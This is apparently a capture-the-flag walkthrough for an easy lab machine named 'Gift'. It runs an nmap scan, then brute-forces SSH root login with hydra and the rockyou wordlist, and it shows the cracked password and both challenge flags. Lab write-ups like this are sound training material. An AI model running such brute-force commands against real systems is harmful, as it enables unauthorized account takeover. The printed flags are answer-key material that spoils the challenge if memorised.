# Gift (Easy)
>MrMidnight | 15.September.2022

_______________________________________________________________________

### Target IP: 192.168.1.112

## 1. Nmapping

```bash
nmap -sC -sV -oA scans/Nmap/target 192.168.1.112
```

Result is an ssh server and a http server running nginx. The website contains nothing interesting. Just a text saying: "Dont Overthink. Really, Its simple." Doing a directory scan or a subdomain fuzzling, doesnt reveal anything at all. Even a "nikto" scan doesnt reveal anything useful. 

## 2. Bruteforce

Well time like this, calls for bruteforcing the ssh login. Ill bruteforce the root user because there isnt any other known user. You can use different tools to bruteforce it, but I will just use hydra:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.112 ssh
```

After a few moment, it returns with a password:

```
[22][ssh] host: 192.168.1.112   login: root   password: simple
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
```

> user: root
> pass: simple

## 3. Getting da flag
Just ssh into it and get the 2 flags.

## USER-FLAG
>HMVtyr543FG


## ROOT-FLAG
>HMV665sXzDS